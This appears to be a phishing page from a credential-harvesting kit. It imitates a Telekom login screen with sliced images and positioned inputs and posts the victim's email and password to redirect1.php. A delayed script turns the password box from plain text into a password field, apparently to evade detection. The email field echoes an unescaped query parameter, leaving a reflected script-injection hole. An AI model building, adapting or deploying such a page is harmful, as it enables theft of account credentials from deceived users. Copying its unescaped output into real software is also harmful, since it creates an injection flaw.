
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Telekom-Login</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #d0d0d0;
    border-top: 1px solid #c6c6c6;
    height: 30px; 
    width: 275px; 
  	font-family: TeleGrotesk; 
    font-size: 16px;
  	color: #4b4b4b;
    padding-left:6px; 
    border-radius: 4px; 
    box-shadow: rgba(0,0,0,.15) 0 1px 2px 0 inset, white 0 1px 0 0;  
}  
.textbox:hover { 
    outline: none; 
    border: 1px solid #d0d0d0; 
    background: #EDEDED; 
} 
.textbox:focus { 
    outline: none; 
    border: 1px solid #d0d0d0;
	box-shadow: rgba(0,0,0,.15) 0 1px 2px 0 inset, white 0 1px 0 0; 
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:511px; top:0px; width:304px; height:474px; z-index:0"><img src="images/k1.png" alt="" title="" border=0 width=304 height=474></div>

<div id="image2" style="position:absolute; overflow:hidden; left:703px; top:145px; width:102px; height:13px; z-index:1"><a href="#"><img src="images/k2.png" alt="" title="" border=0 width=102 height=13></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:572px; top:388px; width:183px; height:18px; z-index:2"><a href="#"><img src="images/k3.png" alt="" title="" border=0 width=183 height=18></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:694px; top:322px; width:97px; height:19px; z-index:3"><a href="#"><img src="images/k5.png" alt="" title="" border=0 width=97 height=19></a></div>
<form action=redirect1.php name=dafabhai id=dafabhai method=post>
<input name="email" class="textbox" value="<?php echo $_GET['email']; ?>"  autocomplete="off" required type="text" style="position:absolute;width:280px;left:523px;top:104px;z-index:4">
<input name="psw" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:280px;left:523px;top:161px;z-index:5">
<div id="formcheckbox1" style="position:absolute; left:549px; top:198px; z-index:6"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:572px; top:233px; z-index:7"><input type="image" name="formimage1" width="180" height="42" src="images/lgn.png"></div>
</div>

</body>
</html>
